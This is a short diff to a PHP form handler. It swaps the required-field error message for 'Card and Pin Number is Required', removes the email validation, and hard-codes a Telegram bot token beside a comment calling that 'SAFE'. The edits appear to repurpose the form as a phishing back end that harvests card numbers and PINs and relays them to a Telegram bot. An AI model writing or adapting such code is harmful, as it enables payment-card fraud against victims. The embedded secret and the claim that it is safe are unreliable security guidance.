@@ -19,15 +19,10 @@ $email = trim($data['email'] ?? '');
 // Basic validation
 if ($name === '' || $email === '') {
     http_response_code(400);
-    echo json_encode(['ok' => false, 'message' => 'Name and email are required']);
+    echo json_encode(['ok' => false, 'message' => 'Card and Pin Number is Required']);
     exit;
 }
 
-if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    http_response_code(400);
-    echo json_encode(['ok' => false, 'message' => 'Invalid email']);
-    exit;
-}
 
 // 🔐 Telegram credentials (SAFE to keep here on cPanel)
 $BOT_TOKEN = '8398672612:AAETz96kZZzPzUDrt-7w7vxNoihaphJkKGk';
